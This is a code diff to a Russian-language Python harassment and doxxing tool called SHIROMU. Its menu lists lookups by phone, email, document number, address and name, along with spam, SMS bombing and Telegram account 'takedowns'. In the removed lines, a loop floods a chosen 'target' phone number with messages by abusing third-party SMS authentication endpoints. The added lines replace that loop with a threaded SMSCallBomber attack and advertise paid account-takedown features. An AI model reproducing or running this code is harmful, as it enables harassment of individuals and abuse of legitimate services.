@@ -18,6 +18,9 @@ import smtplib
 import webbrowser
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
+from smscallbomber import SMSCallBomber
+import threading
+from argparse import Namespace
 
 
 init()
@@ -33,9 +36,12 @@ while True:
     print(Fore.BLUE + "  │         └─────────────────┘         │              └───────────────────┘              │            └───────────┘" + Fore.RESET)
     print(Fore.BLUE + "  ├─ [01] Поиск по номеру телефона      ├─ [07] Поиск по IP адресу                        ├─ [14] Спамер" + Fore.RESET)
     print(Fore.BLUE + "  ├─ [02] Поиск по эл.почте             ├─ [08] Поиск IP-адреса по домену                 ├─ [15] SMS-бомбер" + Fore.RESET)
-    print(Fore.BLUE + "  ├─ [03] Поиск по номеру документа     ├─ [09] Сканирование портов                       ├─ [16]Снос тг аккаунтов" + Fore.RESET)
-    print(Fore.BLUE + "  ├─ [04] Поиск по адресу               ├─ [10] В разработке...                           ├─ [17]Снос тгк" + Fore.RESET)
-    print(Fore.BLUE + "  ├─ [05] Поиск по Instagram            ├─ [11] В разработке...                           ├─ [18]Снос сессии" + Fore.RESET)
+    print(Fore.BLUE + "  ├─ [03] Поиск по номеру документа     ├─ [09] Сканирование портов                       ├─ [16] Снос тг аккаунтов" + Fore.RESET)
+    print(Fore.BLUE + "  ├─ [04] Поиск по адресу               ├─ [10] В разработке...                           ├─ [17] Снос тгк" + Fore.RESET)
+    print(Fore.BLUE + "  ├─ [05] Поиск по Instagram            ├─ [11] В разработке...                           ├─ [18] Снос сессии" + Fore.RESET)
+    print(Fore.BLUE + "  ├                                     ├                                                 ├─ [78] Разбан номера в тг"+ Fore.RESET)
+    print(Fore.BLUE + "  ├                                     ├                                                 ├─ [91] Снос своим текстом" + Fore.RESET)
+    print(Fore.BLUE + "  ├                                     ├                                                 ├─ [93] Снос через сайт" + Fore.RESET)
     print(Fore.BLUE + "  ├─ [06] Поиск по ФИО                  ├─ [12] В разработке...                           └─ [19] след.страница ->>" + Fore.RESET)
     print(Fore.BLUE + "  └─ [52] Поиск по никнейму" + Fore.RESET)
     print(Fore.BLUE + "                                        └─ [13] В разработке...                 ")
@@ -216,19 +222,38 @@ while True:
             print("информации еще нет в базе данных, или что то введено не корректно ")
 
     if vd == 15:
-        phone = input('Введите номер таргета(формат 79009945209): ')
-        phone9 = phone[1:]
-        while True:
-            try:
-                requests.post('https://admin.growfood.pro/api/personal-cabinet/v2_0/authentication/send-sms', data={'phone': phone}, headers={})
-                print('Сообщение отправлено')
-            except:
-                 print('Произошла какая-то ошибка, скорее всего sh1ro еблан и не обновил API-шник')
-            try:
-                requests.post('https://lk.megafon.ru/api/logs/v2/accept', json={'msisdn': phone}, headers={})
-                print('Сообщение отправлено')
-            except:
-                print('Произошла какая-то ошибка, скорее всего sh1ro еблан и не обновил API-шник')
+        phone = int(input("Введите номер таргета(без+): "))
+        args = Namespace(country='ALL', phone=phone, time=20, threads=4, timeout=10, proxy=False)
+        args.time += time.time()
+
+        attack_threads = {}
+        bombers = {}
+        bomber_id = 1234567890
+
+
+        def attack_thread_runner(args):
+            bomber = SMSCallBomber(args)
+            bombers[bomber_id] = bomber
+            bomber.run()
+
+
+        attack_threads = threading.Thread(target=attack_thread_runner, args=(args,))
+        attack_threads.start()
+
+        attack_threads.join(0)
+        del attack_threads
+        time.sleep(10)
+        bomber = bombers[bomber_id]
+        bomber.stop()
+        successful, failed = bomber.send_report()
+        print(f"Сообщений отправлено: {successful}")
+        print(f"Не удалось отправить: {failed}")
+
+        time.sleep(10)
+        bomber = bombers[bomber_id]
+        successful, failed = bomber.send_report()
+        print(f"Сообщений отправлено: {successful}")
+        print(f"Не удалось отправить: {failed}")
 
     if vd == 21:
 
@@ -250,16 +275,20 @@ while True:
             with open('snostgc.txt', 'r', encoding='utf-8') as file:
                 snostgc = file.read()
                 print(snostgc)
-
+    if vd == 91:
+        print("Доступно в платной версии SHIROMU, за покупкой пишите Широ")
 
     if vd == 16:
-        print("Доступно бесплатно в exe-версии, можно взять в discord канале софта")
-
+        print("Доступно в платной версии SHIROMU, за покупкой пишите Широ")
     if vd == 17:
-        print("Доступно в платной версии SHIROMU в exe-версии, подробнее в discord канале")
-
+        print("Доступно в платной версии SHIROMU, за покупкой пишите Широ")
     if vd == 18:
-        print("Доступно в платной версии SHIROMU в exe-версии, подробнее в discord канале")
+        print("Доступно в платной версии SHIROMU, за покупкой пишите Широ")
+    if vd == 78:
+        print("Доступно в платной версии SHIROMU, за покупкой пишите Широ")
+
+    if vd == 93:
+        print("Доступно в платной версии SHIROMU, за покупкой пишите Широ")
 
     if vd == 27:
         API = 'https://www.1secmail.com/api/v1/'
